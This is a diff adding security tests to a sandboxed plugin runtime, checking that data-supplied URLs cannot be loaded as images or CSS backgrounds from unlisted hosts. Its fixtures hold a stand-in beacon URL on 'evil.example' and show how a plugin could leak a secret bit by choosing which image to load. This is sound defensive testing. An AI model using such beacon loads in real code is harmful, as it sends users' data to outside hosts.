@@ -64,7 +64,7 @@ function assertPlain(v: unknown, depth = 0): void {
   if (typeof v === "object") for (const k of Object.keys(v)) assertPlain((v as Record<string, unknown>)[k], depth + 1);
 }
 
-async function inert(src: string, opts: { budget?: number; renders?: number } = {}) {
+async function inert(src: string, opts: { budget?: number; renders?: number; addressHosts?: string[]; people?: { id: string; name: string; avatar: string }[] } = {}) {
   delete G.__pwned;
   const r = compile({ "plugin.thx": src }, todoEnv());
   if (!r.ok) throw new Error(`expected this to compile, to test the runtime:\n${r.errors.map((e) => `${e.line}:${e.column} ${e.code} ${e.message}`).join("\n")}`);
@@ -299,6 +299,57 @@ describe("coercion and mutation", () => {
   test("a list can't be grown into a sparse giant", () => throwsInert(plugin(`const a: number[] = []; a[1000000] = 1;`), /indexes/));
   test("a list's length can't be set", () => throwsInert(plugin(`const a: number[] = [1]; L(a).length = L(0);`), /indexes/));
   test("repeat can't build a huge string", () => throwsInert(plugin(`const s = "x".repeat(100000000);`), /more than the language allows/));
+});
+
+describe("handed-in addresses that load", () => {
+  // redteam-language round 2: a `Url` from data (an avatar field) rendered as <img src> was a zero-click GET to any
+  // host, since only the compiler checked addressHosts, and only on literals. The runtime now checks every load.
+  const people = `${PRE}import { listPeople } from "@app/sdk";\n`;
+  const show = (jsx: string) => `${people}export default definePlugin(main, { name: "x" }, function X() {\nconst t = useQuery(listTodos);\nconst p = useQuery(listPeople);\nif (t.data && p.data && p.data.length > 1) { const a = p.data[0].avatar; const b = p.data[1].avatar; const bit = t.data[1].done; return (${jsx}); }\nreturn null;\n});\n`;
+  const others = [{ id: "p2", name: "Ben", avatar: "https://evil.example/beacon?b=1" }];
+
+  test("a handed-in Url on a host the app did not list can't be an image", async () => {
+    const { threw, app } = await inert(show(`<img src={a} alt="" />`), { renders: 2, people: others });
+    assert.match(String((threw as Error)?.message), /can't load that address/);
+    assert.equal(app.errors.length > 0 || threw !== undefined, true);
+  });
+  test("choosing between handed-in Urls by a secret can't load either", async () => {
+    const { threw } = await inert(show(`<img src={bit ? b : a} alt="" />`), { renders: 2, people: others });
+    assert.match(String((threw as Error)?.message), /can't load that address/);
+  });
+  test("a handed-in Url on an unlisted host can't be a style's url()", async () => {
+    const viaStyle = await inert(show(`<div style={{ backgroundImage: b }} />`), { renders: 2, people: others });
+    assert.match(String((viaStyle.threw as Error)?.message), /can't load that address/);
+    const viaCss = await inert(show(`<div className={css({ backgroundImage: b })} />`), { renders: 2, people: others });
+    assert.match(String((viaCss.threw as Error)?.message), /can't load that address/);
+    assert.ok(![...viaCss.app.styles.values()].some((r) => r.includes("evil.example")), "no rule names the outside host");
+  });
+  test("a handed-in Url on a listed host loads", async () => {
+    const { threw, app } = await inert(show(`<img src={a} alt="" />`), { renders: 2, people: others, addressHosts: ["avatars.example.com"] });
+    assert.equal(threw, undefined);
+    const [img] = app.render() as { props: Record<string, unknown> }[];
+    assert.equal(img.props.src, "https://avatars.example.com/ana.png");
+  });
+  test("a listed host matches exactly, not as a suffix", async () => {
+    const { threw } = await inert(show(`<img src={a} alt="" />`), { renders: 2, people: others, addressHosts: ["example.com"] });
+    assert.match(String((threw as Error)?.message), /can't load that address/);
+  });
+  test("a handed-in Url still works as a link, which waits for a click", async () => {
+    const { threw, app } = await inert(show(`<a href={b}>Ben</a>`), { renders: 2, people: others });
+    assert.equal(threw, undefined);
+    const [link] = app.render() as { props: Record<string, unknown> }[];
+    assert.equal(link.props.href, "https://evil.example/beacon?b=1");
+  });
+  test("a written-out load holds at run time too, without the compiler's check", async () => {
+    const r = compile({ "plugin.thx": element(`<img src="https://cdn.example.com/logo.png" alt="" />`) }, todoEnv({ addressHosts: ["cdn.example.com"] }));
+    assert.ok(r.ok);
+    if (!r.ok) return;
+    const unlisted = await fakeApp(r.code);
+    assert.throws(() => unlisted.render(), /not allowed here/);
+    const listed = await fakeApp(r.code, { addressHosts: ["cdn.example.com"] });
+    const [img] = listed.render() as { props: Record<string, unknown> }[];
+    assert.equal(img.props.src, "https://cdn.example.com/logo.png");
+  });
 });
 
 describe("elements", () => {
